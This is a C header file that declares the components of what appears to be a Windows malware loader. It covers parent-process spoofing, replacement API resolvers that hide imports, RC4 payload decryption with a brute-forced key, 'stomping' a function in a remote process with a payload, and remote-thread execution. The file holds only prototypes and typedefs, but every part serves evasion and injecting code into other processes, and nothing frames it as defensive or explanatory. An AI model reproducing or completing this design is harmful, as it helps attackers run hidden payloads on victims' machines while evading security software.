#pragma once
#undef UNICODE
#include <windows.h>
#include <tlhelp32.h>
#include <ctype.h>
#include <stdio.h>

// Spoofer
BOOL FindPPID(IN LPWSTR sProcessName, OUT HANDLE* hParent, OUT DWORD* dwProcessID);
BOOL CreateSpoofedProcess(IN HANDLE hParentProcess, IN LPCSTR lpProcessName, OUT DWORD* dwProcessId, OUT HANDLE* hProcess, OUT HANDLE* hThread);

typedef HANDLE(*f_CreateToolhelp32Snapshot)(DWORD, DWORD);
typedef BOOL(*f_Process32First)(HANDLE, LPPROCESSENTRY32);
typedef BOOL(*f_Process32Next)(HANDLE, LPPROCESSENTRY32);
typedef HANDLE(*f_OpenProcess)(DWORD, BOOL, DWORD);

typedef DWORD(*f_GetEnvironmentVariableA)(LPCSTR,LPSTR,DWORD);
typedef BOOL(*f_InitializeProcThreadAttributeList)(LPPROC_THREAD_ATTRIBUTE_LIST,DWORD,DWORD,PSIZE_T);
typedef BOOL(*f_UpdateProcThreadAttribute)(LPPROC_THREAD_ATTRIBUTE_LIST,DWORD,DWORD_PTR,PVOID,SIZE_T,PVOID,PSIZE_T);
typedef BOOL(*f_CreateProcessA)(LPCSTR,LPSTR,LPSECURITY_ATTRIBUTES,LPSECURITY_ATTRIBUTES,BOOL,DWORD,LPVOID,LPCSTR,LPSTARTUPINFOA,LPPROCESS_INFORMATION);


// IAT utils
FARPROC GetProcAddressReplacement(IN HMODULE hModule, IN LPCSTR lpApiName);
HMODULE GetModuleHandleReplacement(IN LPCWSTR szModuleName);
BOOL IsStringEqual(IN LPCWSTR Str1, IN LPCWSTR Str2);

typedef VOID (*f_WaitForSingleObject)(HANDLE, DWORD);
typedef HANDLE(*f_CreateRemoteThread)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef BOOL(*f_VirtualProtectEx)(HANDLE, LPVOID, SIZE_T, DWORD, PDWORD);
typedef BOOL(*f_WriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T);

// RC4

typedef struct
{
	unsigned int i;
	unsigned int j;
	unsigned char s[256];

} Rc4Context;

BYTE BruteDecryption(IN BYTE bFirstByte, IN PBYTE pEncrypted, IN SIZE_T sEncrypted, OUT PBYTE* pDecrypted);
void rc4Init(Rc4Context* context, const unsigned char* key, size_t length);
void rc4Cipher(Rc4Context* context, const unsigned char* input, unsigned char* output, size_t length);

// Stomper
PVOID StompRemoteFunction(IN HANDLE hProcess, IN LPCWSTR sStompModule, IN LPCSTR sStompFunction, IN PVOID pPayload, IN SIZE_T sPayloadSize);

// Execution
VOID RemoteThreadExecute(IN HANDLE hProcess, IN PVOID pAddress);